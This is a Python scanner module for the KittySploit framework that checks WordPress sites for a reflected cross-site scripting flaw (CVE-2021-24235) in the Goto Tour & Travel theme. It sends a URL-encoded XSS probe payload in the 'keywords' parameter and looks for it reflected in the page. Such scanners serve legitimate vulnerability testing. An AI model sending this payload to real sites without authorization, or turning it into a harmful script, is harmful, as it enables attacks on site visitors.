#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Goto Tour & Travel theme before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Goto Tour & Travel Theme <2.0 - Cross-Site Scripting Detection',
        'description': 'WordPress Goto Tour & Travel theme before 2.0 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize the keywords and start_date GET parameters on its Tour List page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'wp-theme', 'wpscan', 'wordpress', 'boostifythemes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/eece90aa-582b-4c49-8b7c-14027f9df139',
            'https://m0ze.ru/vulnerability/[2021-02-10]-[WordPress]-[CWE-79]-Goto-WordPress-Theme-v1.9.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24235',
            'https://m0ze.ru/vulnerability/%5B2021-02-10%5D-%5BWordPress%5D-%5BCWE-79%5D-Goto-WordPress-Theme-v1.9.txt',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24235',
    }

    def run(self):
        r = self.http_request(method="GET", path='/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('input/Autofocus/%0D*/Onfocus=alert(123);', 'goto-tour-list-js-extra',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Goto Tour & Travel Theme <2.0 - Cross-Site Scripting detected",
                path='/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13',
            )
            return True
        return False

